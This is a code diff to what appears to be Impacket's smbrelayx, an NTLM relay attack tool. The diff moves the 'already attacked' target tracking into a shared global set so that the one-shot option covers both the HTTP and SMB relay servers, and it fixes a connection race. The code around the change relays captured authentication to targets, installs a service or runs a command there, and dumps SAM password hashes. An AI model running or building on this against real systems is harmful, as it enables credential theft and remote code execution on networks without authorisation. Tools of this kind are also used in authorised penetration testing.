@@ -59,6 +59,10 @@ except Exception:
     logging.critical("Warning: You don't have any crypto installed. You need PyCrypto")
     logging.critical("See http://www.pycrypto.org/")
 
+# Global Variables
+# This is the list of hosts that have been attacked already in case -one-shot was chosen
+ATTACKED_HOSTS = set()
+
 class doAttack(Thread):
     def __init__(self, SMBClient, exeFile, command):
         Thread.__init__(self)
@@ -79,11 +83,14 @@ class doAttack(Thread):
 
     def run(self):
         # Here PUT YOUR CODE!
+        global ATTACKED_HOSTS
         if self.__exeFile is not None:
             result = self.installService.install()
             if result is True:
                 logging.info("Service Installed.. CONNECT!")
                 self.installService.uninstall()
+            else:
+                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
         else:
             from secretsdump import RemoteOperations, SAMHashes
             samHashes = None
@@ -99,6 +106,7 @@ class doAttack(Thread):
             except Exception, e:
                 # Something wen't wrong, most probably we don't have access as admin. aborting
                 logging.error(str(e))
+                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
                 return
 
             try:
@@ -117,6 +125,7 @@ class doAttack(Thread):
                     samHashes.dump()
                     logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception, e:
+                ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
                 logging.error(str(e))
             finally:
                 if samHashes is not None:
@@ -410,7 +419,6 @@ class HTTPRelayServer(Thread):
             self.mode = mode
             self.returnStatus = returnStatus
             self.outputFile = outputFile
-            self.attacked = set()
             self.one_shot = one_shot
 
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
@@ -425,7 +433,9 @@ class HTTPRelayServer(Thread):
             self.machineAccount = None
             self.machineHashes = None
             self.domainIp = None
-            if self.server.target in self.server.attacked and self.server.one_shot:
+
+            global ATTACKED_HOSTS
+            if self.server.target in ATTACKED_HOSTS and self.server.one_shot:
                 logging.info(
                     "HTTPD: Received connection from %s, skipping %s, already attacked" % (client_address[0], self.server.target))
                 return
@@ -523,10 +533,13 @@ class HTTPRelayServer(Thread):
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.outputFile)
 
+                    # Target will be attacked, adding to the attacked set
+                    # If the attack fails, the doAttack thread will be responsible of removing it from the set
+                    global ATTACKED_HOSTS
+                    ATTACKED_HOSTS.add(self.target)
                     clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                     clientThread.start()
-                    # Target attacked already, adding to the attacked set
-                    self.server.attacked.add(self.target)
+
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
@@ -632,27 +645,24 @@ class SMBRelayServer(Thread):
             del smbData[self.target]
 
         # Let's check if we already attacked this host.
-        if smbData.has_key('Attacked'):
-            if self.target in smbData['Attacked'] and self.one_shot is True:
-                logging.info("SMBD: Received connection from %s, skipping %s, already attacked" % (connData['ClientIP'] ,self.target))
-                packet = smb.NewSMBPacket()
-                packet['Flags1'] = smb.SMB.FLAGS1_REPLY
-                packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS
-                packet['Command'] = recvPacket['Command']
-                packet['Pid'] = recvPacket['Pid']
-                packet['Tid'] = recvPacket['Tid']
-                packet['Mid'] = recvPacket['Mid']
-                packet['Uid'] = recvPacket['Uid']
-                packet['Data'] = '\x00\x00\x00'
-                errorCode = STATUS_NOT_SUPPORTED
-                packet['ErrorCode'] = errorCode >> 16
-                packet['ErrorClass'] = errorCode & 0xff
+        global ATTACKED_HOSTS
+        if self.target in ATTACKED_HOSTS and self.one_shot is True:
+            logging.info("SMBD: Received connection from %s, skipping %s, already attacked" % (connData['ClientIP'] ,self.target))
+            packet = smb.NewSMBPacket()
+            packet['Flags1'] = smb.SMB.FLAGS1_REPLY
+            packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS
+            packet['Command'] = recvPacket['Command']
+            packet['Pid'] = recvPacket['Pid']
+            packet['Tid'] = recvPacket['Tid']
+            packet['Mid'] = recvPacket['Mid']
+            packet['Uid'] = recvPacket['Uid']
+            packet['Data'] = '\x00\x00\x00'
+            errorCode = STATUS_NOT_SUPPORTED
+            packet['ErrorCode'] = errorCode >> 16
+            packet['ErrorClass'] = errorCode & 0xff
 
-                return None, [packet], STATUS_NOT_SUPPORTED
-            else:
-                logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
+            return None, [packet], STATUS_NOT_SUPPORTED
         else:
-            smbData['Attacked'] = set()
             logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
 
         try: 
@@ -674,7 +684,7 @@ class SMBRelayServer(Thread):
             logging.error(str(e))
         else: 
             encryptionKey = client.get_encryption_key()
-            smbData[self.target] = {} 
+            smbData[self.target] = {}
             smbData[self.target]['SMBClient'] = client
             if encryptionKey is not None:
                 connData['EncryptionKey'] = encryptionKey
@@ -692,6 +702,7 @@ class SMBRelayServer(Thread):
         #############################################################
 
         respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
+        global ATTACKED_HOSTS
 
         if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
             # Extended security. Here we deal with all SPNEGO stuff
@@ -726,6 +737,37 @@ class SMBRelayServer(Thread):
                 #############################################################
                 # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client. 
                 # Let's send it to the target server and send the answer back to the client.
+
+                # Let's check if we already attacked this host.
+                global ATTACKED_HOSTS
+                if self.target in ATTACKED_HOSTS and self.one_shot is True:
+                    logging.info("SMBD: Received connection from %s, skipping %s, already attacked" % (
+                    connData['ClientIP'], self.target))
+                    packet = smb.NewSMBPacket()
+                    packet['Flags1'] = smb.SMB.FLAGS1_REPLY
+                    packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS
+                    packet['Command'] = recvPacket['Command']
+                    packet['Pid'] = recvPacket['Pid']
+                    packet['Tid'] = recvPacket['Tid']
+                    packet['Mid'] = recvPacket['Mid']
+                    packet['Uid'] = recvPacket['Uid']
+                    packet['Data'] = '\x00\x00\x00'
+                    errorCode = STATUS_NOT_SUPPORTED
+                    packet['ErrorCode'] = errorCode >> 16
+                    packet['ErrorClass'] = errorCode & 0xff
+
+                    return None, [packet], STATUS_NOT_SUPPORTED
+
+                # It might happen if the target connects back before a previous connection has finished, we might
+                # get to this function w/o having the dict and smbClient entry created, because a
+                # NEGOTIATE_CONNECTION was not needed
+                if smbData.has_key(self.target) is False:
+                    smbData[self.target] = {}
+                    smbClient = SMBClient(self.target)
+                    smbClient.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
+                    smbClient.set_timeout(60)
+                    smbData[self.target]['SMBClient'] = smbClient
+
                 smbClient = smbData[self.target]['SMBClient']
                 clientChallengeMessage = smbClient.sendNegotiate(token) 
                 challengeMessage = ntlm.NTLMAuthChallenge()
@@ -798,10 +840,11 @@ class SMBRelayServer(Thread):
                                               self.server.getJTRdumpPath())
                     del (smbData[self.target])
 
+                    # Target will be attacked, adding to the attacked set
+                    # If the attack fails, the doAttack thread will be responsible of removing it from the set
+                    ATTACKED_HOSTS.add(self.target)
                     clientThread = doAttack(smbClient,self.exeFile,self.command)
                     clientThread.start()
-                    # Target attacked already, adding to the attacked set
-                    smbData['Attacked'].add(self.target)
 
                     # Now continue with the server
                 #############################################################
@@ -875,10 +918,11 @@ class SMBRelayServer(Thread):
                                           self.server.getJTRdumpPath())
                 # Remove the target server from our connection list, the work is done
                 del (smbData[self.target])
+                # Target will be attacked, adding to the attacked set
+                # If the attack fails, the doAttack thread will be responsible of removing it from the set
+                ATTACKED_HOSTS.add(self.target)
                 clientThread = doAttack(smbClient, self.exeFile, self.command)
                 clientThread.start()
-                # Target attacked already, adding to the attacked set
-                smbData['Attacked'].add(self.target)
                 # Now continue with the server
 
 
@@ -967,7 +1011,7 @@ if __name__ == '__main__':
     parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND',
                         help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-one-shot', action='store_true', default=False,
-                        help='After successful authentication, only execute the attack once for each target (and protocol)')
+                        help='After successful authentication, only execute the attack once for each target')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
     parser.add_argument('-machine-account', action='store', required=False,
